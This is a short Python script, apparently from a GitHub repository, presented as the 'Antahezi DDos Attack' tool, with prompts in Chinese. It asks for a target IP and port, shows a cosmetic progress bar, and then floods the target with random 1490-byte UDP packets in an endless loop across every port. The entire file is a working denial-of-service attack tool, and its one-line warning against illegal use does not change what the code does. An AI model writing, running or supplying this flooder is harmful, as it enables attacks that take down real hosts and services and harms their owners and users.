#python3
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Antahezi DDos Attack")
print('[                      by Antahezi                        ]')
print('[                        版本 1.0                         ]')
print('[        Github ： https://github.com/ANTA311/ddos        ]')
print('[                       请勿非法使用                      ]')
ip = input("请输入 IP     : ")
port = input("攻击端口      : ")
port = int(port)

os.system("clear")
os.system("figlet Antahezi DDos Attack")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     if port == 65534:
       port = 1